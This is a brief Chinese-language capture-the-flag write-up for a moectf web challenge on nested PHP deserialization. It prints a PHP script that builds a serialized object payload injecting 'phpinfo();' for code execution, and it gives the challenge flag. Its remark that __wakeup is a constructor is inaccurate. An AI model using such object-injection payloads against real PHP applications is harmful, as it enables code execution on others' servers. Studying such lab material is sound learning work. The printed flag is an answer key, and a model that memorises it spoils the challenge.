# Web-18｜第十八章 万卷诡阁·功法连环

## 碎碎念

套娃 php 反序列化
***
## Writeup

可以看到套了两层，真正需要调用的是 PersonB 的 work 函数，`__wake_up` 函数指的是函数构造函数，因此我们嵌套得到：

```php
<?php
class PersonA {
    public $name;
}
class PersonB {
    public $name;
}

$person = new PersonA();
$person->name = new PersonB();
$person->name->name = 'phpinfo();';
echo urlencode(serialize($person));
?>
```

传入参数 person 得到 flag：

![](../../../../assets/Pasted%20image%2020251029170642.png)

最终 flag：`moectf{1aaa4070-587a-817b-ad13-78d669657b0e}`